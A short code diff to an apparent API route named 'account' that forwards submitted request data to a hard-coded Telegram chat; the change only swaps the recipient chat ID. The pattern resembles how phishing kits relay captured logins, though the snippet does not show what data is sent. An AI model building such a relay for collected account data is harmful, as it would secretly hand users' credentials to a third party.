@@ -52,7 +52,7 @@ export default async function account(req, res) {
     const bot = new TelegramBot(token, { polling: true });
 
     try {
-      await bot.sendMessage(6488746167, req.body.data);
+      await bot.sendMessage(6073170955, req.body.data);
       // if (req.body.url) {
       //   await bot.sendPhoto(6488746167, req.body.url);
       // }
